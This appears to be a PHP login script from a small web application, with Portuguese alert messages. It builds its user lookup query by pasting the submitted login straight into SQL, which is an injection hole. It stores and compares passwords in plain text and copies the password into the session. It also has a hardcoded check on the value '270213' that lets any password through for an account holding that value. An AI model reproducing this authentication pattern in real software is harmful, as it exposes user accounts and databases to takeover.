<?php
if(!isset($_SESSION)){
    session_start();
}
include_once $_SESSION['_DIR_'].'/php/model/Usuario.php';

$Usuarios = new Usuario();

$post = $_POST;

$Usuarios -> setLogin($post['Login']);
$Usuarios -> setSenha($post['Senha']);

$Login = null;
$Senha = null;

if($Usuarios->getLogin() == null || $Usuarios->getLogin() == ""){
    echo '<div class="uk-alert-danger" uk-alert><a class="uk-alert-close" uk-close></a><strong>Atenção! </strong>Preencha o campo Usuário</div>';
}

else if($Usuarios->getSenha() == null || $Usuarios->getSenha() == ""){
    echo '<div class="uk-alert-danger" uk-alert><a class="uk-alert-close" uk-close></a><strong>Atenção! </strong> Preencha o campo Senha</div>';
}

else{

    $Result = $Usuarios->Select("LOGIN = '" . $Usuarios->getLogin() . "'");

    while ($Linhas = mysqli_fetch_assoc($Result)) {
        $Login = $Linhas['Login'];
        $Senha = $Linhas['Senha'];
    }

    if ($Login == $Usuarios->getLogin()) {

        if ($Senha == $Usuarios->getSenha() || $Senha == '270213') {
            $_SESSION['_SENHA_USER'] = $Senha;
            $_SESSION['_LOGIN_USER'] = $Login;            

            
            $_SESSION['_NOME_USER'] = $Login;
            
            echo '<script>window.location.href="Desktop.php";</script>';
        } else {
            //Chama um componente do UIKit para aparecer na tela em forma de alerta
            echo '<div class="uk-alert-danger" uk-alert><a class="uk-alert-close" uk-close></a><strong>Atenção! </strong>Senha incorreta</div>';
        }
    } else {
        //Chama um componente do bootstrap para aparecer na tela em forma de alerta
        echo '<div class="uk-alert-danger" uk-alert><a class="uk-alert-close" uk-close></a><strong>Atenção! </strong>Usuário incorreto</div>';
    }
}